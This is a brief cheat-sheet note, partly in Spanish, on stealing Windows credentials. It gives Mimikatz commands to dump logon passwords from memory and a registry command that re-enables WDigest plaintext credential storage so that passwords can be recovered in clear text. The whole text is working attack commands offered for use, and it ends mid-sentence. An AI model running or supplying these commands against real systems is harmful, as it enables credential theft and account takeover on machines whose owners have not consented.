Dump credentials :
mimikatz.exe
privilege::debug
sekurlsa::logonPasswords full


Hay veces en que el wdigest esté protegido y no permitirá dumpear los passwords en texto plano. Para desprotegerlo (si tenemos permisos de admin):
cmd:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

gpupdate /force

intentamos nuevamente y tendrían que aparecer 
